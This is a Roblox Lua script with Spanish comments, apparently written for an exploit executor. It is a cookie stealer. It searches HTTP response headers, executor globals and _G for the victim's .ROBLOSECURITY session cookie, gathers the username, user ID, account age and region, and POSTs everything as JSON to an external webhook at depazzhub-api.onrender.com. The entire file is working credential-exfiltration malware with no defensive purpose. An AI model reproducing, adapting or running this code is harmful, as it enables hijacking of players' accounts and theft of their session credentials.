-- =====================================================================
-- WEBHOOK CON EXTRACCIÓN VÍA HTTP_REQUEST
-- =====================================================================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

-- FUNCIÓN DE EXTRACCIÓN USANDO HTTP_REQUEST
local function GetCookieViaHttpRequest()
    local cookie = nil
    
    -- MÉTODO 1: Hacer request a Roblox y obtener cookie de los headers
    if type(http_request) == "function" then
        print(" Intentando obtener cookie vía http_request...")
        
        local success, result = pcall(function()
            return http_request({
                Url = "https://www.roblox.com/home",
                Method = "GET",
                Headers = {
                    ["User-Agent"] = "Mozilla/5.0"
                }
            })
        end)
        
        if success and result then
            -- Buscar cookie en los headers de respuesta
            if result.Headers and result.Headers["set-cookie"] then
                local setCookie = result.Headers["set-cookie"]
                print(" Set-Cookie encontrado:", string.sub(setCookie, 1, 100))
                
                -- Extraer .ROBLOSECURITY
                for cookieStr in string.gmatch(setCookie, "[^,]+") do
                    local name, value = string.match(cookieStr, "%s*(.-)=(.-);")
                    if name == ".ROBLOSECURITY" then
                        cookie = value
                        print("✅ Cookie extraída de Set-Cookie header")
                        break
                    end
                end
            end
            
            -- También buscar en result.Cookies si existe
            if not cookie and result.Cookies then
                print("📋 Cookies encontradas en response.Cookies")
                for name, value in pairs(result.Cookies) do
                    if name == ".ROBLOSECURITY" then
                        cookie = value
                        print("✅ Cookie extraída de result.Cookies")
                        break
                    end
                end
            end
        else
            warn("❌ Error en http_request:", result)
        end
    end
    
    -- MÉTODO 2: Variables de entorno
    if not cookie then
        local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie"}
        for _, name in ipairs(envNames) do
            local env = getgenv()
            if env[name] and tostring(env[name]) ~= "" then
                cookie = tostring(env[name])
                print("✅ Cookie obtenida de getgenv()." .. name)
                break
            end
        end
    end
    
    -- MÉTODO 3: Buscar en _G
    if not cookie and _G[".ROBLOSECURITY"] then
        cookie = tostring(_G[".ROBLOSECURITY"])
        print("✅ Cookie obtenida de _G")
    end
    
    if cookie then
        return ".ROBLOSECURITY=" .. cookie
    end
    
    return "COOKIE_NO_DISPONIBLE"
end

-- FUNCIONES AUXILIARES
local function GetAccountAge()
    return tostring(player.AccountAge) .. " días"
end

local function GetRegion()
    local success, region = pcall(function()
        return LocalizationService.RobloxLocaleId
    end)
    return success and tostring(region) or "Desconocida"
end

-- RECOPILACIÓN DE DATOS
local cookie = GetCookieViaHttpRequest()

local data = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId,
    gameId = placeId,
    accountAge = GetAccountAge(),
    region = GetRegion(),
    cookie = cookie
}

-- FUNCIÓN DE ENVÍO USANDO request()
local function SendWebhook(url, data)
    local jsonData = HttpService:JSONEncode(data)
    
    if type(request) == "function" then
        return pcall(request, {
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    end
    
    if type(http_request) == "function" then
        return pcall(http_request, {
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    end
    
    return pcall(function()
        return game:GetService("HttpService"):PostAsync(url, jsonData)
    end)
end

-- ENVÍO
local webhookUrl = "https://depazzhub-api.onrender.com/log"

print("📤 Enviando webhook para:", player.Name)
print(" Cookie:", string.sub(cookie, 1, 50) .. "...")

local success, response = SendWebhook(webhookUrl, data)

if success then
    print("✅ Webhook enviado correctamente!")
    if response and response.StatusCode then
        print(" Status:", response.StatusCode)
    end
else
    warn("❌ Error:", response)
end
